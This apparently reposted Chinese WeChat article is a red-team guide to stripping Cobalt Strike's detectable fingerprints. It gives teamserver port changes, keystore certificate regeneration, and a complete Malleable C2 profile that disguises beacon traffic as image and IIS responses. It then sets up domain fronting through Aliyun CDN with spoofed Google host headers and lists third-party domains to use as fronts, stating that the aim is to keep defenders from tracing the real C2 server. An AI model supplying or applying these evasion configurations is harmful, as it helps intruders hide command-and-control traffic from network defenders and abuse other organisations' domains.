> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/i_q1ZJmdCqNdLkh4c8Xv8A)

### **Cobalt Strike 简介**

Cobalt Strike is software for Adversary Simulations and Red Team Operations. Cobalt Strike 简称 CS， A-team 详细介绍使用网址。CS 是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。 多人运动来不来？

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6NEOKX4Bnr0UNSMTddcqhMARdg5Nkvn6B4ug54XS49z6d3c19J7IOIQ/640?wx_fmt=jpeg)

### **去除特征的三种方式**

#### **1. 修改默认端口**

第一种是直接编辑 teamserver 进行启动项修改。- ./teamserver 1.1.1.1 password 直接修改 teamserver vim teamserver

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6PINRz24F0UmZkj3mgwflqToVcZrTjgibVd7PcjNBGNb0UIFhWShicDkA/640?wx_fmt=jpeg)

第二种是启动的时候指定 server_port 端口

```
- java -XX:ParallelGCThreads=4 -Duser.language=en -Dcobaltstrike.server_port=50505 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -Xmx1024m -classpath ./cobaltstrike.jar server.TeamServer xxx.xxx.xx.xx test google.profile
```

**2. 去除证书特征**

进入 cs 目录。

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6KK4t2ZZU7MaLO2GJq0cO1L8kFGjn0Ob2OicCzMsnjbR3osic0p6OloTg/640?wx_fmt=jpeg)

查看 keytool -list -v -keystore cobaltstrike.store 证书情况，输入默认密码 123456 回车，可以看到所有者、发布者中 Cobalt Strike 相关字样。

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6BusTGmCRUl9GCSgpUibUka2kZULFwIMISxCx2KakUYOdbnjLZODserw/640?wx_fmt=jpeg)

keytool 是一个 Java 数据证书的管理工具，使用如下：keytool -keystore cobaltstrike.store -storepass 密码 -keypass 密码 -genkey -keyalg RSA -alias google.com -dname "CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)。

example: `keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias google.com -dname "CN=US, OU=google.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN"`

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6UQHQgZaRseQClosJVhAEsX2aGwUJsE10MNv2tajxLCNFic9iaBeqPzzg/640?wx_fmt=jpeg)

未修改 cobaltstrike.store 前：

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk69jjicosXglUsr6nIAqcyAAXIweRaxwWtdl3I7XVVsCmqwVnTcEjFUbQ/640?wx_fmt=jpeg)

修改 cobaltstrike.store 后，可以看到 cobalt strike 等关键字样已经去除：

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6L4s8HWgASDUCK25ExxqicYBicOKE05RgHulsbIeNgmAaBBJvxbIdZicsA/640?wx_fmt=jpeg)

google.profile 模版可以参考 C2.profile（https://github.com/rsmudge/Malleable-C2-Profiles/tree/master/APT）和 malleable-c2 （https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.0.profile）设置后，可以看到访问 / image / 后已经返回的是我们设置好的 header 了 "Content-Type" "img/jpg"; "Server" "nginx/1.10.3 (Ubuntu)";

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk64GPWqJwjia7fldZfSnQkZKlckngGxUgpOGQIrSAE1t3Og9XfPWmEoXA/640?wx_fmt=jpeg)

部分引用源码如下：

```
#
# cs profile
#   http://www.secureworks.com/cyber-threat-intelligence/threats/secrets-of-the-comfoo-masters/
#   https://github.com/rsmudge/Malleable-C2-Profiles/
# Author: @keyi
#

set sample_name "google";

set sleeptime "5000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";

http-get {

    set uri "/image/";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8";
        header "Referer" "http://www.google.com";
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";

        metadata {
            netbios;
            append "-.jpg";
            uri-append;
        }
    }

    server {

        header "Content-Type" "img/jpg";
        header "Server" "nginx/1.10.3 (Ubuntu)";

        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/history/";

    client {

        header "Content-Type" "application/octet-stream";
        header "Referer" "http://www.google.com";
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";

        id {
            netbiosu;
            append ".asp";
            uri-append;
        }

        output {
            base64;
            print;
        }
    }

    server {

        header "Content-Type" "img/jpg";
        header "Server" "Microsoft-IIS/6.0";
        header "X-Powered-By" "ASP.NET";

        output {
            base64;
            print;
        }
    }
}
```

**3. 修改 Cobalt Strike dns_idle**

0.0.0.0 是 Cobalt Strike DNS Beacon 特征可设置 Malleable C2 进行修改 输入 set dns_idle "8.8.8.8";

### **域前置**  

#### **原理**

> 域前置（英语：Domain fronting），是一种隐藏连接真实端点来规避互联网审查的技术。在应用层上运作时，域前置使用户能通过 HTTP 连接到白名单域名（如 *.google.cn），无直接与 C2 服务器的通信。介绍：被攻击机器 -> `www.microport.com`(走 aliyun cdn 的域名，根据设定的 host 头: dns.google.cn 找到对应的 vps_ip) -> cdn 流量转发到 vps_ip(c2 真实地址)
> 
> ![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6lhFbJsTwuYMVYsEPo4jibrpKjCrGUJaoCEPJh17ALHcXPia1T9YnPrDw/640?wx_fmt=jpeg)

#### **实战配置 CDN**

购买云服务器，开通 CDN 服务。加速域名：随便填个高信誉的域名实现域名伪造，例如：oss.microsoft.com，dns.google.com 之类的。

登陆 aliyun。

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6Xiaibghe8GTz8Ia5PZtT58Rp78C1Dd1zWg0BxsFBx1VJh6hn5zp1YuXg/640?wx_fmt=jpeg)

在 IP 位置填写 cs_teamserver 的 IP 地址。

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6FkchMHo3o8d1icZzWPupX0iaztSdI9My5wboqcDMgjbiaeCRDmZ1kj77Q/640?wx_fmt=jpeg)

配置 c2 的 Stager 的域名为走 cdn 的地址，如：`www.microport.com.cn`

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6robZjhJMgoTSlZkq1MhgpmM7YvrvkAqicj3WTnDibBrpBjVOYXqlOfmQ/640?wx_fmt=jpeg)

`www.microport.com.cn`这种是走 aliyun cdn 的。其中`dns.google.cn`是伪造的域名地址，目的是目标机器访问 cdn 的时候可以根据 google.cn 特征找到对应的 vps_ip。有没人跟我有相同的疑问，这个走 aliyun 的 cdn 域名如何获取。这边波师傅给我提供了一些，可能域名作废或者不走 cdn 了，大家可以根据 curl 做一下测试。

```
admin.bjexpo.com
admin.cailianpress.com
admin.cheyian.com
admin.cydf.com
admin.ebp2p.com
admin.k3.cn
admin.ks5u.com
admin.kyjxy.com
admin.lezi.com
admin.weiba66.com
admin.wuzhenfestival.com
admin.xingfujie.cn
admin.yxp2p.com
anxin360.com
api.3658mall.com
api.bjexpo.com
api.cheyian.com
api.cydf.com
api.ebp2p.com
api.ks5u.com
api.kyjxy.com
api.lanjinger.com
api.my089.com
api.thecover.cn
api.uiyi.cn
api.utcard.cn
api.weiba66.com
api.wuzhenfestival.com
api.xingfujie.cn
api.yxp2p.com
api.zaozuo.com
app.bjexpo.com
app.chanjet.com
app.cheyian.com
app.ebp2p.com
app.eeo.com.cn
app.gfedu.cn
app.guojimami.com
app.hao24.cn
app.hrmarket.net
app.k3.cn
app.kyjxy.com
app.lanjinger.com
app.lezi.com
app.meiduimall.com
app.sanqin.com
app.sanqin.com
```

配置成功后，输入 `curl -v "www.microport.com/een" -H "Host:dns.google.cn"` 可以查看 cs 的 weblog, 看见请求 / een 的日志，证明配置成功。

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6Sbhkd0nUsfsHib6SpTXh9IRDGnxY4OgZOL8hjEFu7TFZicMEpz7ukFicA/640?wx_fmt=jpeg)

cs 生成 Windows exe，运行成功上线. 可以看到 14.17.67.46 东莞 IP 上线。无直接跟 c2 连接的域名信息，这样来说蓝队在防守的时候看到的是白名单域名，并且也无法溯源到我们真实的 vps 地址。

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3ML7MItmwV2WFvKjp9Plk6FuU2lT7wKUhok3kebIpUV8pstfV45T34VyYyWfEia4KplLhtSia6yXrw/640?wx_fmt=jpeg)

作者：Keyi，转载于：https://paper.seebug.org/1349/

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“如侵权请私聊公众号删文”

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**